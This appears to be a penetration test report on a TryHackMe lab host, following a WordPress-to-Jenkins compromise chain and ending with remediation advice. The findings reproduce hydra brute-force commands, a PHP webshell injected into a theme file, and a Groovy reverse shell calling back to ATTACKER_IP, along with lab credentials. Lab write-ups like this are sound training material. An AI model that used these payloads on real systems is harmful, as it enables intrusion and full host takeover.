Internal — Penetration Test Disclosure Report

TryHackMe Hard · 2026-07-14

Target: 10.65.132.113 Assessment Date: 2026-07-14 Classification: CONFIDENTIAL

1. Executive Summary

A penetration test was conducted against the target 10.65.132.113 (internal.thm). The assessment identified five security vulnerabilities that, when chained, allowed an unauthenticated attacker to achieve full compromise of the host. Initial access was gained by brute-forcing weak WordPress admin credentials, followed by injecting a PHP webshell via the WordPress Theme Editor. The webshell executed inside a Docker container, revealing additional credentials that enabled SSH access to the host. Privilege escalation was achieved by brute-forcing weak Jenkins credentials on an internal service, then using the Jenkins Script Console to execute arbitrary code as root. Both user and root flags were captured.

5. Detailed Findings

F-01: Weak WordPress Admin Credentials

Severity: High (CVSSv3: 7.5) Affected Component: WordPress login form (/blog/wp-login.php)

Description: The WordPress administrator account uses a weak password (my2boys) that is discoverable via dictionary-based brute-force. The password is present in the rockyou wordlist (positions 2000-5000). No account lockout mechanism or rate limiting is enforced on the login endpoint.

Steps to Reproduce:

hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  10.65.132.113 http-post-form \
  '/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fblog%2Fwp-admin%2F&testcookie=1:The password you entered for the username' \
  -t 4 -f

Result:

[80][http-post-form] host: 10.65.132.113   login: admin   password: my2boys

Impact: An attacker gains full administrative access to the WordPress installation, including the ability to modify theme files, install plugins, and execute arbitrary PHP code.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — Network accessible, low complexity, no authentication required, high confidentiality and integrity impact.

F-02: Unrestricted Theme Editor — PHP Webshell Injection

Severity: Critical (CVSSv3: 9.8) Affected Component: WordPress Theme Editor (/blog/wp-admin/theme-editor.php)

Description: WordPress allows administrators to edit theme PHP files directly through the admin dashboard. The twentyseventeen theme's functions.php was modified to inject a PHP webshell that executes arbitrary commands via the cmd GET parameter. No file integrity monitoring, code review workflow, or DISALLOW_FILE_EDIT configuration was in place.

Steps to Reproduce:

  1. Log in as admin via /blog/wp-login.php
  2. Navigate to Appearance → Theme Editor → twentyseventeen theme → functions.php
  3. Append the following at the end of the file:
    4. add_action("init", function(){
    if(isset($_REQUEST["cmd"])){
        $cmd = $_REQUEST["cmd"];
        $out = shell_exec($cmd . " 2>&1");
        file_put_contents("/tmp/shell_out.txt", $out);
        echo $out;
    }
});
  4. Click "Update File"
  5. Execute commands via:
    6. curl "http://internal.thm/blog/?cmd=id"

Result:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

The webshell executes inside a Docker container (confirmed by /.dockerenv and /proc/1/cgroup). The container runs Apache/WordPress as www-data (uid=33).

Impact: Full remote code execution on the server. The attacker can read arbitrary files, exfiltrate data, install persistent backdoors, and pivot to internal services.

CVSS Justification: AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H — Requires admin authentication, but grants full code execution with scope change.

F-03: Hardcoded Credentials in /opt/wp-save.txt

Severity: High (CVSSv3: 7.5) Affected Component: /opt/wp-save.txt

Description: A plaintext file containing system user credentials is stored at /opt/wp-save.txt inside the Docker container. The file is readable by the www-data user and contains SSH credentials for the aubreanna account. This file is accessible from both the container and the host.

Evidence:

Bill,
Aubreanna needed these credentials for something later.
Let her know you have them and where they are.
aubreanna:bubb13guM!@#123

Impact: An attacker with command execution in the Docker container reads this file and gains SSH access to the host system as aubreanna, a user with membership in the adm, cdrom, dip, and plugdev groups.

CVSS Justification: AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N — Requires authenticated access to the web application but provides horizontal privilege escalation to the host.

F-04: Hardcoded Database Credentials in wp-config.php

Severity: Medium (CVSSv3: 6.5) Affected Component: /var/www/html/wordpress/wp-config.php (inside container)

Description: The WordPress configuration file contains database credentials in plaintext. While this is standard WordPress configuration, the credentials (wordpress:wordpress123) are weak and could be reused on other services.

Evidence:

define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'wordpress123' );
define( 'DB_HOST', 'localhost' );
define( 'DB_NAME', 'wordpress' );

Impact: Database credentials are exposed. If the MySQL service is accessible from other systems or if the password is reused, this enables unauthorized database access.

CVSS Justification: AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:N — Requires authenticated access; impact limited to database credential disclosure.

F-05: Weak Jenkins Credentials on Internal Network

Severity: High (CVSSv3: 8.8) Affected Component: Jenkins 2.250 on 172.17.0.2:8080 (internal, Docker network)

Description: A Jenkins instance is running on the internal Docker network at 172.17.0.2:8080. The Jenkins admin account uses weak credentials discoverable via brute-force. Jenkins provides a Script Console that allows authenticated users to execute arbitrary Groovy code, which runs with the privileges of the Jenkins process (root in this case).

Steps to Reproduce:

  1. Establish SSH tunnel: ssh -N -L 8080:172.17.0.2:8080 aubreanna@10.65.132.113
  2. Brute-force Jenkins admin credentials:
    3. hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  127.0.0.1 -s 8080 http-post-form \
  '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:loginError' \
  -t 4 -f
  3. Log in to Jenkins → Manage Jenkins → Script Console
  4. Execute Groovy reverse shell:
    5. String host="ATTACKER_IP";int port=4444;String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);InputStream si=s.getInputStream();
OutputStream so=s.getOutputStream();OutputStream po=p.getOutputStream();
while(!s.isClosed()){while(si.available()>0)po.write(si.read());
po.flush();while(p.getInputStream().available()>0)po.write(p.getInputStream().read());
po.flush();if(p.exitValue()>0)break;}

Impact: Full root-level code execution on the host system via Jenkins Script Console. The attacker can read any file, install persistent backdoors, and fully compromise the system.

CVSS Justification: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H — Network accessible on internal network, low complexity, requires authentication, scope change, full CIA impact.

6. Remediation Recommendations

Order Finding Action
1 F-01 Enforce strong password policy for WordPress admin accounts. Implement login rate limiting (e.g., Limit Login Attempts plugin).
2 F-02 Set DISALLOW_FILE_EDIT = true in wp-config.php. Implement file integrity monitoring (e.g., OSSEC, Tripwire). Review theme/plugin files for unauthorized modifications.
3 F-03 Remove hardcoded credential files from the filesystem. Use a secrets manager or environment variables for credential storage. Rotate the exposed aubreanna password immediately.
4 F-04 Use a strong, unique database password. Restrict MySQL access to only the web application process.
5 F-05 Enforce strong Jenkins admin credentials. Restrict Jenkins access to authorized networks only. Disable Script Console access for non-administrators. Implement Jenkins audit logging.
